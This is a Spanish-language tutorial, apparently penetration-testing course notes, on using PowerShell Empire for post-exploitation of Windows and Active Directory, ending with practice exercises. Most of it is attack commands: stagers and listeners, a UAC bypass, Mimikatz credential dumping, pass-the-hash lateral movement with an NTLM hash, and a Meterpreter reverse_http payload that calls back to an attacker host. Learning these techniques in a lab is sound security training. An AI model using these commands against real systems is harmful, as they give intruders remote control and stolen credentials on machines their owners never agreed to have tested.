# Powershell Empire

Propietario: Adrian Gisbert Cabello

### 1. Introducción a PowerShell Empire

PowerShell Empire es una herramienta de post-explotación que se enfoca en la explotación del lado del cliente y la post-explotación de despliegues de Active Directory (AD). Utiliza PowerShell en Windows y Python en Linux y macOS, apoyándose en bibliotecas y características preinstaladas .

### 2. Instalación y Configuración

1. **Clonar el repositorio y ejecutar el script de instalación:**
    
    ```bash
    cd /opt
    sudo git clone https://github.com/PowerShellEmpire/Empire.git
    cd Empire/
    sudo ./setup/install.sh
    ```
    
2. **Iniciar Empire:**
    
    ```bash
    sudo ./empire
    ```
    
3. **Comandos básicos en la consola de Empire:**
    
    ```
    help              # Mostrar el menú de ayuda
    listeners         # Interactuar con listeners activos
    usestager         # Utilizar un stager de Empire
    agents            # Interactuar con agentes activos
    ```
    

### 3. Listeners y Stagers

- **Crear un listener:**
    
    ```
    (Empire) > uselistener http
    ```
    
- **Configurar y ejecutar un stager:**
    
    ```
    (Empire: listeners) > usestager windows/launcher_bat
    (Empire: stager/windows/launcher_bat) > set Listener http
    (Empire: stager/windows/launcher_bat) > execute
    ```
    

### 4. Uso de Agentes

- **Visualizar agentes activos:**
    
    ```
    (Empire: agents) > agents
    ```
    
- **Interactuar con un agente:**
    
    ```
    (Empire: agents) > interact <agent_name>
    ```
    
- **Ejecutar comandos en el agente:**
    
    ```
    (Empire: <agent_name>) > sysinfo
    ```
    

### 5. Módulos de PowerShell Empire

### 5.1. Situational Awareness

- **Enumeración de usuarios en Active Directory:**
    
    ```
    (Empire: <agent_name>) > usemodule situational_awareness/network/powerview/get_user
    (Empire: powershell/situational_awareness/network/powerview/get_user) > execute
    ```
    

### 5.2. Escalada de Privilegios

- **Ejecutar todos los chequeos de PowerUp para identificar vulnerabilidades de escalada de privilegios:**
    
    ```
    (Empire: <agent_name>) > usemodule privesc/powerup/allchecks
    (Empire: powershell/privesc/powerup/allchecks) > execute
    ```
    
- **Bypass de UAC con `bypassuac_fodhelper`:**
    
    ```
    (Empire: <agent_name>) > usemodule privesc/bypassuac_fodhelper
    (Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http
    (Empire: powershell/privesc/bypassuac_fodhelper) > execute
    ```
    

### 5.3. Mimikatz en Empire

- **Ejecutar Mimikatz para extraer contraseñas de sesión:**
    
    ```
    (Empire: <agent_name>) > usemodule credentials/mimikatz/logonpasswords
    (Empire: powershell/credentials/mimikatz/logonpasswords) > execute
    ```
    

### 5.4. Movimiento Lateral

- **Usar `invoke_smbexec` para movimiento lateral:**
    
    ```
    (Empire: <agent_name>) > usemodule lateral_movement/invoke_smbexec
    (Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName client251
    (Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http
    (Empire: powershell/lateral_movement/invoke_smbexec) > set Username jeff_admin
    (Empire: powershell/lateral_movement/invoke_smbexec) > set Hash e2b475c11da2a0748290d87aa966c327
    (Empire: powershell/lateral_movement/invoke_smbexec) > set Domain corp.com
    (Empire: powershell/lateral_movement/invoke_smbexec) > execute
    ```
    

### 6. Uso Conjunto de Empire y Metasploit

- **Generar un payload de Meterpreter:**
    
    ```bash
    msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -f exe -o met.exe
    ```
    
- **Configurar un listener en Metasploit:**
    
    ```
    msf5 > use multi/handler
    msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
    msf5 exploit(multi/handler) > set LPORT 7777
    msf5 exploit(multi/handler) > set LHOST 10.11.0.4
    msf5 exploit(multi/handler) > exploit
    ```
    
- **Subir y ejecutar el payload desde Empire:**
    
    ```
    (Empire: <agent_name>) > upload /path/to/met.exe
    (Empire: <agent_name>) > shell met.exe
    ```
    

### 7. Ejercicios Prácticos

1. **Instalar y configurar PowerShell Empire en Kali Linux.**
2. **Crear un listener y un stager, y ejecutar el stager en una máquina Windows para obtener un agente activo.**
3. **Usar módulos de Empire para enumeración, escalada de privilegios y movimiento lateral.**
4. **Combinar Empire y Metasploit para ejecutar payloads y obtener sesiones Meterpreter.**